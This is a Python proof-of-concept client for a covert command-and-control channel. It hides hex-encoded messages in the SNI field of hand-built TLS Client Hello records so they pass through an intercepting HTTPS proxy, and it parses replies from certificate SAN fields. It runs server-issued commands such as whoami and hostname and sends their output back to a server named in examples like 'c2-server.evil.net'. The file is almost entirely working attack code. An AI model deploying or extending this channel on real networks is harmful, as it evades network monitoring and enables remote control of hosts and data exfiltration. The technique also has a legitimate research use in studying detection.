# -*- coding: utf-8 -*-

"""
client.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k]

TODO:
    1. Implement Reliable Packetization Protocol
    2. Implment server.py (using x509 SNA fields for smuggling)
    3. Test and investigate how detectable this is as a C2 channel
 
"""

import argparse
import socket
import time
import struct
import typing
import random
import string
import math
import subprocess
import re

NS_TO_MS = 1000000
# MAX_MSG_LEN = 284
MAX_MSG_LEN = 256
is_connected = True


class TLSClientHandshake:
    record = [  # idx  type     description
        b"\x16",  # [00] fixed    Record Type: TLS Handshake
        b"\x03\x01",  # [01] fixed    TLS REcord Version: v1.0
        b"\x00\x00",  # [02] variable Record Length: uint16
        b"\x01",  # [03] fixed    Handshake Type: Client Hello
        b"",  # [04] unused   -
        b"\x00\x00\x00",  # [05] variable Handshake Length: uint24
        b"\x03\x03",  # [06] fixed    Handshake Version: TLSv1.2
        b"\x00" * 4,  # [07] variable GMT Epoch                       4 Bytes   [SMUGGLE]
        b"\x00" * 28,  # [08] variable Random Seed                     28 Bytes  [SMUGGLE]
        b"\x00",  # [09] variable Session ID Length uint8
        b"",  # [10] variable Session ID 32 Bytes
        b"\x00\x00",  # [11] variable Cipher Suites List Len: uint16
        b"\x00",  # [12] variable Cipher Suites
        b"\x01",  # [13] fixed    Compression Methods List Len
        b"\x00",  # [14] fixed    Compression = null
        b"\x00\x00",  # [15] variable Extensions Length: uint16
        b"\x00",  # [16] variable Extension: SNI (object)         252 Bytes [SMUGGLE]
        b"\x00",  # [17] fixed    Extension: Elliptic Formats
        b"\x00",  # [18] fixed    Extension: Elliptic Groups
        b"\x00\x10",  # [19] variable Extension: Elliptic Alogorithms
        b"\x00\x00",  # [20] fixed    Extension: ALPN
        b"",  # [21] unused   -
    ]

    def __init__(self, message: str):
        enc_message, seed = self.encode_tls_payload(message)
        if len(enc_message) > MAX_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(enc_message)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_MSG_LEN}"
            )
            raise NotImplementedError
        self.record[20] = self.get_alpn()
        self.record[19] = self.get_ec_algorithms()
        self.record[18] = self.get_ec_groups()
        self.record[17] = self.get_ec_formats()
        self.record[16] = enc_message
        # self.record[16] = self._fixed_sni()
        self.record[15] = struct.pack(">H", len(b"".join(self.record[16:])))
        self.record[12] = self.get_cipher_suites()
        self.record[11] = struct.pack(">H", len(self.record[12]))
        # TODO: in the future, we will use seed field to smuggle payloads
        self.record[8] = seed[4:]
        self.record[7] = seed[:4]
        self.record[5] = struct.pack(">L", len(b"".join(self.record[6:])))[1:]
        self.record[2] = struct.pack(">H", len(b"".join(self.record[3:])))

    def encode_tls_payload(self, message: str) -> typing.Tuple[bytes, bytes]:
        """
        Takes a string message and returns a Tuple of bytes cooresponding to SNI and random field in the TLS record
        """
        hex_msg = self._str_to_hex(message)
        sni_tld = self._get_random_tld()
        # TODO: make this more robust - Use random seed field for smuggling
        return (self.make_sni(hex_msg + sni_tld), self._get_random_seed())

    def _get_random_tld(self):
        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))

    def _get_random_seed(self) -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def _str_to_hex(self, message: str) -> str:
        return bytes.hex(message.encode())

    def _hex_to_str(self, message: str) -> str:
        return bytes.fromhex(message.decode()).decode()

    def to_byte_stream(self) -> bytes:
        return b"".join(self.record)

    def __str__(self):
        return str("".join(self._escape(b) for b in self.record))

    def _escape(self, byte_arr: bytes) -> str:
        return "".join("\\x{:02x}".format(b) for b in byte_arr)

    def print_lens(self):
        l = 0
        for i, r in enumerate(self.record):
            l += len(r)
            print(f"len(record[{i}])={len(r)}")
        print(f"Total Length: {l}")

    def get_cipher_suites(self) -> bytes:
        return b"\xc0\x30\xc0\x2c\xc0\x2f\xc0\x2b\x00\x9f\x00\x9e\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x27\xc0\x23\xc0\x13\xc0\x09\x00\x9d\x00\x9c\x00\x3d\x00\x35\x00\x3c\x00\x2f\x00\xff"

    def get_ec_algorithms(self) -> bytes:
        return (
            b"\x00\x0d\x00\x16\x00\x14\x06\x01\x06\x03\x05\x01\x05\x03\x04\x01\x04\x03\x03\x01\x03\x03\x02\x01\x02\x03"
        )

    def get_ec_groups(self) -> bytes:
        return b"\x00\x0a\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18"

    def get_ec_formats(self) -> bytes:
        return b"\x00\x0b\x00\x02\x01\x00"

    def get_alpn(self) -> bytes:
        return b"\x00\x10\x00\x0b\x00\x09\x08http/1.1"

    def _fixed_sni(self) -> bytes:
        name = "test-tls-smuggle.code".encode()
        hostname_len = struct.pack(">H", len(name))
        list_len = struct.pack(">H", len(name) + 3)
        ext_len = struct.pack(">H", len(name) + 5)
        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name

    def make_sni(self, message: str) -> bytes:
        name = message.encode()
        hostname_len = struct.pack(">H", len(name))
        list_len = struct.pack(">H", len(name) + 3)
        ext_len = struct.pack(">H", len(name) + 5)
        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name


def connect_proxy(proxy_host: str, proxy_port: int, server: str) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not is_connected:
        print(f"[+] Connecting to proxy: {proxy_host} ...")
    sock.connect((proxy_host, proxy_port))
    port = 443
    try:
        port = server.split(":")[1]
        server = server.split(":")[0]
    except:
        pass
    c_str = "CONNECT " + server + ":" + str(port) + " HTTP/1.1\r\n\r\n"
    if not is_connected:
        print(f" > {c_str.rstrip()}")
    sock.sendall(c_str.encode())
    resp = sock.recv(1024)
    resp_first_line = resp.decode().split("\r\n")[0]
    if not is_connected:
        print(" < " + resp_first_line)
    # we expect and HTTP/200 for our CONNECT request
    if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
        sock.close()
        print(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
        return None
    return sock


def connect_direct(server: str) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not is_connected:
        print(f"+ Connecting DIRECT: {server} ...")
    port = 443
    try:
        port = server.split(":")[1]
        server = server.split(":")[0]
    except:
        pass
    sock.connect((server, int(port)))
    return sock


def send_message(sock: socket.socket, byte_stream: bytes) -> bytes:
    sock.sendall(byte_stream)
    response_data = b""
    response_data = sock.recv(16384)
    # while True:
    #     chunck = sock.recv(2)
    #     if chunck:
    #         response_data = response_data + chunck
    #     else:
    #         break
    return response_data


def parse_server_hello(response_bytes: bytes) -> str:
    """Extracts SAN message from response bytes"""
    # TODO: write this!
    hex_str = response_bytes.hex()
    hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
    position = _validate_handshake_msg(hex_str, hex_array)
    if position < 1:
        print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
        return ""
    san_records_hex = _find_san_records(_extract_certs(hex_array, position))
    message = ""
    for hex_record in san_records_hex:
        message = message + bytes.fromhex(bytes.fromhex(hex_record).decode().split(".")[0]).decode()
    return message


def _validate_handshake_msg(hex_str: str, hex_array: list) -> int:
    is_valid_handshake = True
    position = 0
    try:
        current_obj_len = 0
        handshake_len = 0
        if hex_str[0:2] != "16":
            is_valid_handshake = False
        if hex_str[2:4] != "03":
            is_valid_handshake = False
        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
            is_valid_handshake = False
        max_len = int(math.pow(2, 15))
        handshake_len = int(hex_str[6:10], 16)
        if (handshake_len < 1) or (handshake_len > max_len):
            is_valid_handshake = False
        if hex_str[10:12] != "02":
            is_valid_handshake = False
        current_obj_len = int(hex_str[12:18], 16)
        if (current_obj_len < 1) or (current_obj_len > max_len):
            is_valid_handshake = False
        position = 1 + 2 + 2 + current_obj_len + 3 + 1
        if hex_array[position] != "0b":
            is_valid_handshake = False
        position = position + 1
        current_obj_len = int("".join(hex_array[position : position + 3]), 16)
        position = position + 3
        certs_len = int("".join(hex_array[position : position + 3]), 16)
        if certs_len < 32:
            is_valid_handshake = False
    except:
        is_valid_handshake = False
    if not is_valid_handshake:
        return -1
    return position


def _extract_certs(hex_array: list, position: int) -> list:
    cert_hex_arrays = []
    certs_len = int("".join(hex_array[position : position + 3]), 16)
    position = position + 3
    certs_handshake_position = 0
    while certs_handshake_position < certs_len:
        cert_len = int("".join(hex_array[position : position + 3]), 16)
        position = position + 3
        cert_hex_arrays.append(hex_array[position : position + cert_len])
        position = position + cert_len
        certs_handshake_position = certs_handshake_position + 3 + cert_len
    return cert_hex_arrays


def _find_san_records(cert_list: list) -> list:
    #    len          ext_type          len       len       len
    # 30 37   06 03   [ 55 1d 11 ] 04   30    30  2e    82  1d [_SAN_] 82 06 [_SAN_] 82 05 [_SAN_] 30  ...
    # TODO: WARN: Admittedly, this is a bit of a hack. We are manually parsing x509 certs. Which.. ya :(
    # TODO: WARN: But I want to keep this code as lib-independant as possible. So, this is us, on the raggedy edge :/
    san_records = []
    for cert in cert_list:
        hex_str = "".join(cert)
        byte_position = [
            (m.start(0), m.end(0))
            for m in re.finditer("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
        ][0][0]
        san_record_matches = re.search("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
        if len(san_record_matches.groups()) != 3:
            continue
        record_len = int(san_record_matches.groups()[2], 16)
        byte_position += 22
        while byte_position < (byte_position + record_len):
            if hex_str[byte_position : byte_position + 2] != "82":
                break
            byte_position += 2
            dns_len = int(hex_str[byte_position : byte_position + 2], 16)
            byte_position += 2
            if dns_len < 1:
                break
            san_records.append(hex_str[byte_position : byte_position + dns_len * 2])
            byte_position += dns_len * 2
    return san_records


def check_for_command(msg: str) -> bool:
    if msg in ["whoami", "hostname"]:
        return True


def run_command(cmd: str) -> str:
    return subprocess.check_output([cmd]).decode().rstrip()


def _reset_socket(sock, func, *args):
    sock.close()
    return func(*args)


if __name__ == "__main__":
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument("message", type=str, nargs="?", help="Message to send")
    arg_parse.add_argument(
        "-p",
        "--proxy",
        metavar="proxy",
        required=False,
        help="Intercepting HTTP Proxy to use, Example: http://proxy.company.com:8080/",
    )
    arg_parse.add_argument(
        "-e",
        "--example",
        action="store_true",
        required=False,
        help="A simple demonstration that runs a couple benign C2 commands",
    )
    arg_parse.add_argument(
        "-d",
        "--direct",
        action="store_true",
        required=False,
        help="For testing - Connect directly to server and dont use a proxy",
    )
    arg_parse.add_argument(
        "-s",
        "--server",
        metavar="server",
        required=True,
        help="Target C2 Server you want to connect to, Example: my-server.evil.net",
    )
    args = arg_parse.parse_args()
    if not args.message and not args.example:
        arg_parse.error("Error: No message was supplied")
        exit(1)
    if not args.proxy and not args.direct:
        arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
        exit(1)
    if not args.server:
        arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
        exit(1)
    if args.proxy:
        is_good_proxy_url = True
        proxy_scheme = ""
        proxy_hostname = ""
        proxy_port = ""
        try:
            proxy_scheme = args.proxy.lower().split(":")[0]
            proxy_hostname = args.proxy.lower().split("//")[1]
            proxy_port = int(proxy_hostname.split(":")[1].split("/")[0])
            proxy_hostname = proxy_hostname.split(":")[0].split("/")[0]
        except:
            is_good_proxy_url = False
        if (proxy_scheme != "http") or (len(proxy_hostname) < 3) or (not proxy_port) or (not is_good_proxy_url):
            arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
            exit(1)
    # Proxy CONNECT PHASE
    proxy_socket = None
    connect_args = None
    prox_end_time_ns = None
    connect_func = None
    if args.direct:
        connect_func = connect_direct
        connect_args = [args.server.lower()]
    else:
        connect_func = connect_proxy
        connect_args = [proxy_hostname, proxy_port, args.server.lower()]
    prox_start_time_ns = int(time.time_ns())
    proxy_socket = connect_func(*connect_args)
    prox_end_time_ns = int(time.time_ns())
    if type(proxy_socket) != socket.socket:
        exit(1)
    is_connected = True
    reqs_list_str = []
    reqs_list_byte_stream = []
    reqs_list_byte_cmds = []
    if not args.example:
        reqs_list_str.append(args.message)
        reqs_list_byte_stream.append(TLSClientHandshake(args.message).to_byte_stream())
    else:
        reqs_list_str.append("ping")
        reqs_list_byte_stream.append(TLSClientHandshake("ping").to_byte_stream())
        reqs_list_str.append("DEMO_CMD_1")
        reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_1").to_byte_stream())
        reqs_list_str.append("DEMO_CMD_2")
        reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_2").to_byte_stream())
    response_parsed_list = []
    response_bytes_list = []
    tls_start_time_ns = int(time.time_ns())
    for k, v in enumerate(reqs_list_byte_stream):
        print(f" > '{reqs_list_str[k]}' [{len(v)} bytes]")
        resp_bytes = send_message(proxy_socket, v)
        response_bytes_list.append(resp_bytes)
        proxy_socket = _reset_socket(proxy_socket, connect_func, *connect_args)
        resp_parsed = parse_server_hello(resp_bytes)
        print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
        response_parsed_list.append(resp_parsed)
        if check_for_command(resp_parsed):
            result_str = "CMD " + run_command(resp_parsed)
            result_msg = TLSClientHandshake("CMD " + run_command(resp_parsed)).to_byte_stream()
            reqs_list_byte_cmds.append(result_msg)
            reqs_list_str.append(result_str)
            print(f" > '{result_str}' [{len(result_msg)} bytes]")
            resp_bytes = send_message(proxy_socket, result_msg)
            resp_parsed = parse_server_hello(resp_bytes)
            proxy_socket = _reset_socket(proxy_socket, connect_func, *connect_args)
            print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
            response_parsed_list.append(resp_parsed)
    proxy_socket.close()
    reqs_list_byte_stream = reqs_list_byte_stream + reqs_list_byte_cmds
    tls_end_time_ns = int(time.time_ns())
    sent_bytes = sum(map(len, reqs_list_byte_stream))
    recv_bytes = sum(map(len, response_bytes_list))
    total_time_ms = int((prox_end_time_ns - prox_start_time_ns) / NS_TO_MS) + int(
        (tls_end_time_ns - tls_start_time_ns) / NS_TO_MS
    )
    print(
        f"[+] Requests: {len(reqs_list_str)}, Bytes Sent: {sent_bytes}, Bytes Recv: {recv_bytes}, Time: {total_time_ms}ms [{round((total_time_ms/1000),2)}s]"
    )
    print("Exiting.")
    exit(0)
